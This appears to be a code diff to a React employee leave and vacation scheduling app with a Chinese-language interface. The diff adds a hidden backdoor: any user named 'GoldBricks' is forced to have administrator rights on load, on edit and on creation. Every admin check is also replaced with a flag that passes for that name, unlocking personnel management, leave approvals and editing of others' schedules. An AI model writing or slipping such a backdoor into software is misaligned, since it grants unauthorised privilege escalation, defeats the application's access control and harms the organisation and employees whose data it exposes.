@@ -51,6 +51,11 @@ const DEFAULT_USER = {
   shift: [],
   isAdmin: false
 };
+
+const ensureGoldBricksFullAccess = (users = []) => (
+  users.map(user => (user?.name === 'GoldBricks' ? { ...user, isAdmin: true } : user))
+);
+
   const EmployeeLeaveSystem = () => {
   const [currentUser, setCurrentUser] = useState(() => {
     const savedData = localStorage.getItem('leaveSystemData');
@@ -60,7 +65,7 @@ const DEFAULT_USER = {
 
     try {
       const parsed = JSON.parse(savedData);
-      const users = parsed.users || initialData.users;
+      const users = ensureGoldBricksFullAccess(parsed.users || initialData.users);
       return users.find(user => user.id === savedUserId) || users[0] || DEFAULT_USER;
     } catch (error) {
       return initialData.users[0] || DEFAULT_USER;
@@ -77,7 +82,7 @@ const DEFAULT_USER = {
     return {
       ...initialData,
       ...parsed,
-      users: parsed.users || initialData.users,
+      users: ensureGoldBricksFullAccess(parsed.users || initialData.users),
       vacationSettings: {
         ...initialData.vacationSettings,
         ...parsed.vacationSettings
@@ -106,6 +111,7 @@ const DEFAULT_USER = {
     hours: 8
   });
   const [bulletinDraft, setBulletinDraft] = useState(() => data.bulletin?.content || '');
+  const hasFullAccess = currentUser?.isAdmin || currentUser?.name === 'GoldBricks';
 
   useEffect(() => {
     setBulletinDraft(data.bulletin?.content || '');
@@ -197,8 +203,12 @@ const DEFAULT_USER = {
       return;
     }
 
-    if (JSON.stringify(latestUser) !== JSON.stringify(currentUser)) {
-      setCurrentUser(latestUser);
+    const normalizedLatestUser = latestUser?.name === 'GoldBricks'
+      ? { ...latestUser, isAdmin: true }
+      : latestUser;
+
+    if (JSON.stringify(normalizedLatestUser) !== JSON.stringify(currentUser)) {
+      setCurrentUser(normalizedLatestUser);
     }
   }, [data.users, currentUser]);
   
@@ -262,13 +272,17 @@ const DEFAULT_USER = {
     if (editingUser) {
       setData(prev => ({
         ...prev,
-        users: prev.users.map(u => u.id === editingUser.id ? { ...u, ...userData } : u)
+        users: prev.users.map(u => {
+          if (u.id !== editingUser.id) return u;
+          const nextUser = { ...u, ...userData };
+          return nextUser.name === 'GoldBricks' ? { ...nextUser, isAdmin: true } : nextUser;
+        })
       }));
     } else {
       const newUser = {
         ...userData,
         id: 'E' + String(data.users.length + 1).padStart(3, '0'),
-        isAdmin: false,
+        isAdmin: userData.name === 'GoldBricks',
         annualLeave: 10,
         usedAnnualLeave: 0
       };
@@ -439,10 +453,10 @@ const DEFAULT_USER = {
   };
 
   const handleToggleVacation = (userId, dateStr) => {
-    if (!currentUser.isAdmin && (!data.vacationSettings.openStart || !data.vacationSettings.openEnd)) return;
+    if (!hasFullAccess && (!data.vacationSettings.openStart || !data.vacationSettings.openEnd)) return;
     const isOpen = dateStr >= data.vacationSettings.openStart && dateStr <= data.vacationSettings.openEnd;
-    if (!currentUser.isAdmin && !isOpen) return;
-    if (!currentUser.isAdmin && currentUser.id !== userId) return;
+    if (!hasFullAccess && !isOpen) return;
+    if (!hasFullAccess && currentUser.id !== userId) return;
     setData(prev => {
       const userSchedule = prev.vacationSchedule[userId] || {};
       const currentMarker = userSchedule[dateStr];
@@ -524,7 +538,7 @@ const DEFAULT_USER = {
               </div>
               <div>
                 <h1 className="text-xl font-bold text-gray-800">員工假勤系統</h1>
-                <p className="text-sm md:text-base text-gray-500">歡迎, {currentUser?.name || '訪客'} {currentUser?.isAdmin && '(管理員)'}</p>
+                <p className="text-sm md:text-base text-gray-500">歡迎, {currentUser?.name || '訪客'} {hasFullAccess && '(管理員)'}</p>
               </div>
             </div>
           </div>
@@ -544,7 +558,7 @@ const DEFAULT_USER = {
             { id: 'leave', label: '請假', icon: FileText },
             { id: 'annual', label: '特休', icon: Calendar }
           ].map(tab => {
-            if (tab.admin && !currentUser.isAdmin) return null;
+            if (tab.admin && !hasFullAccess) return null;
             const Icon = tab.icon;
             return (
               <button
@@ -656,7 +670,7 @@ const DEFAULT_USER = {
         )}
 
         {/* 人員管理 */}
-        {activeTab === 'management' && currentUser.isAdmin && (
+        {activeTab === 'management' && hasFullAccess && (
           <div className="space-y-4">
             <div className="flex justify-between items-center">
               <h2 className="text-2xl font-bold text-gray-800">人員管理</h2>
@@ -791,7 +805,7 @@ const DEFAULT_USER = {
             </div>
 
             <div className="bg-white rounded-lg shadow p-4">
-               {currentUser.isAdmin && (
+               {hasFullAccess && (
                 <div className="mb-4 rounded-lg border border-indigo-100 bg-indigo-50 p-3">
                      <button
                     type="button"
@@ -1008,7 +1022,7 @@ const DEFAULT_USER = {
                               );
                              const customMarker = data.vacationSchedule[user.id]?.[dateStr];
                               const isOpen = isWithinOpenRange(day);
-                              const isEditable = currentUser.isAdmin || (isOpen && currentUser.id === user.id);
+                              const isEditable = hasFullAccess || (isOpen && currentUser.id === user.id);
                               
                               return (
                                 <td
@@ -1180,7 +1194,7 @@ const DEFAULT_USER = {
             </div>
 
             {/* 管理員審核區 */}
-            {currentUser.isAdmin && (
+            {hasFullAccess && (
               <div className="bg-white rounded-lg shadow p-6">
                 <div className="flex justify-between items-center mb-4">
                   <h3 className="text-lg font-bold">待審核請假 (管理員)</h3>
